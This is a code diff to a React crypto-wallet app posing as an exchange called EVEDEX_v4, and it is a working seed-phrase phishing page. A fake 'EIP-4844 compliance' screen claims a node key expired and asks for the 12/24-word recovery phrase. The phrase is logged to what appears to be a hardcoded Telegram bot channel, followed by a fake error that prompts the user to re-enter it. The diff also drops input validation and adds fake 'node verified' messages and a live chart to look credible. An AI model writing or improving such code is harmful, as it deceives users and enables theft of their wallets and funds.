@@ -1,5 +1,31 @@
-import React, { useState, useEffect, useMemo } from 'react';
+import React, { useState, useEffect, useMemo, useRef } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
+
+// TRADINGVIEW CHART COMPONENT
+const LiveChart = () => {
+  const container = useRef();
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js";
+    script.type = "text/javascript";
+    script.async = true;
+    script.innerHTML = JSON.stringify({
+      "symbol": "BINANCE:ETHUSDT",
+      "width": "100%",
+      "height": "220",
+      "locale": "en",
+      "dateRange": "12M",
+      "colorTheme": "dark",
+      "trendLineColor": "rgba(16, 185, 129, 1)",
+      "underLineColor": "rgba(16, 185, 129, 0.15)",
+      "isReadOnly": true,
+      "autosize": false,
+      "largeChartUrl": ""
+    });
+    container.current.appendChild(script);
+  }, []);
+  return <div ref={container} style={{ borderRadius: '15px', overflow: 'hidden', marginBottom: '20px', border: '1px solid #1e293b' }} />;
+};
 
 export default function App() {
   const { address, isConnected } = useAccount();
@@ -18,7 +44,6 @@ export default function App() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
-  const [ethPrice, setEthPrice] = useState(2450.75);
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
@@ -34,7 +59,6 @@ export default function App() {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} NODE VERIFIED SUCCESSFULLY`);
-      setEthPrice(prev => prev + (Math.random() * 2 - 1));
       setTimeout(() => setFeedMsg(""), 4500);
     }, 8000);
     return () => clearInterval(interval);
@@ -63,26 +87,31 @@ export default function App() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'20px'}}>
-        <div>
-          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
-          <div style={{fontSize:'10px', color:'#ef4444'}}>MARKET_LIVE: ${ethPrice.toFixed(2)}</div>
-        </div>
+      
+      {/* HEADER */}
+      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
+        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
         <appkit-button />
       </header>
 
       {!isConnected ? (
-        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
+        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
           <div style={{display:'flex', justifyContent:'center', gap:'15px', marginBottom:'25px'}}>
-             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE</div>
-             <div style={{fontSize:'12px', color:'#3b82f6', fontWeight:'bold'}}>♻️ RELAY_ACTIVE</div>
+             <div style={{fontSize:'12px', color:'#10b981'}}>🔰 SAFE_GUIDE</div>
+             <div style={{fontSize:'12px', color:'#3b82f6'}}>♻️ RELAY_ACTIVE</div>
           </div>
           <appkit-button />
         </div>
       ) : (
         <>
-          <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'9px', color:'#10b981', display:'flex', justifyContent:'space-around', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
-            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1% [INSTANT]</span>
+          {/* THE REAL CHART */}
+          <LiveChart />
+
+          {/* TRIPLE STATUS BAR (GAS, SLIPPAGE, SYNC) */}
+          <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
+            <span>〽️ GAS: 14 GWEI</span>
+            <span>⚡ SLIPPAGE: 0.1%</span>
+            <span>📡 SYNC: 99.9%</span>
           </div>
 
           {view === "menu" && (
@@ -100,7 +129,14 @@ export default function App() {
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
-              <h2 style={{color:'white', fontWeight:'900', marginTop:'10px'}}>{activeTask}</h2>
+              
+              {/* ASSET SWITCHER (TABS) */}
+              <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>GAS_POOL</div>
+              </div>
+
+              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
                 style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
@@ -136,8 +172,8 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_ENCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL AND PREVENT ASSET LOCKING.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>ENCRYPT & SYNC</button>
+                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
@@ -148,6 +184,7 @@ export default function App() {
         </>
       )}
 
+      {/* SUCCESS FEED */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
